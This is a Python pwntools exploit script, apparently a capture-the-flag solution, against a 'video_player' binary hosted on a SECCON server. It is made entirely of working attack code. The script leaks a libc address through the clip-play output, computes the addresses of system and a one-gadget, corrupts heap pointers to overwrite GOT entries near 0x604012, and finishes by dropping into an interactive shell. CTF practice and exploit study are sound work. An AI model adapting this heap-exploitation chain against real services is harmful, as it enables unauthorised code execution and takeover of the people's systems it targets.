#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

#host = "10.211.55.6"
#port = 8888
host = "video_player.pwn.seccon.jp"
port = 7777
r = remote(host,port)


def add_video_clip(reso,fps,frams,data,desc):
    r.recvuntil(">>")
    r.sendline("1")
    r.recvuntil(">>")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(reso)
    r.recvuntil(":")
    r.send(p32(fps))
    r.recvuntil(":")
    r.send(p32(frams))
    r.recvuntil(":")
    r.send(data)
    r.recvuntil(":")
    r.sendline(desc)

def edit_video_clip(idx,reso,fps,frams,data,desc):
    r.recvuntil(">>")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(reso)
    r.recvuntil(":")
    r.send(p32(fps))
    r.recvuntil(":")
    r.send(p32(frams))
    r.recvuntil(":")
    r.send(data)
    r.recvuntil(":")
    r.sendline(desc)

def play(idx):
    r.recvuntil(">>")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

def remove(idx):
    r.recvuntil(">>")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))

name = "a"
r.recvuntil("?")
r.sendline(name)
add_video_clip("dada",50,0x90,"a","da")
add_video_clip("dada",50,0x90,"aa","da")
add_video_clip("dada",50,0x90,"aaa","da")
add_video_clip("dada",50,0x90,"aaaa","da")
add_video_clip("dada",50,0x90,"aaaaa","da")
add_video_clip("dada",50,0x50,"aaaaa","da")

data = "\x00" 
for i in range(5):
    play(i)
    r.recvuntil("...\n")
    data += chr(ord(r.recvuntil("\n")[:-1][-1]) ^ 0xcc)
libc = u64(data.ljust(8,"\x00")) - 0x3c4b00 
print "libc:",hex(libc)
fake = 0x604012
system = libc + 0x45390
memset = libc + 0x172930
magic= libc + 0x45216
edit_video_clip(5,"da",50,0x30,p64(fake),"da")
add_video_clip("dada",50,0x30,"a"*22 + "bbbbbbb","da")
add_video_clip("dada",50,0x30, p64(memset)[2:] +p64(magic)*2 + "bbbbbbb","da")

r.recvuntil(">>")
r.sendline("1")
r.recvuntil(">>")
r.sendline("1")
r.recvuntil(":")
r.sendline("dada")
r.recvuntil(":")
r.send(p32(0))
r.recvuntil(":")
r.send(p32(0))
r.interactive()
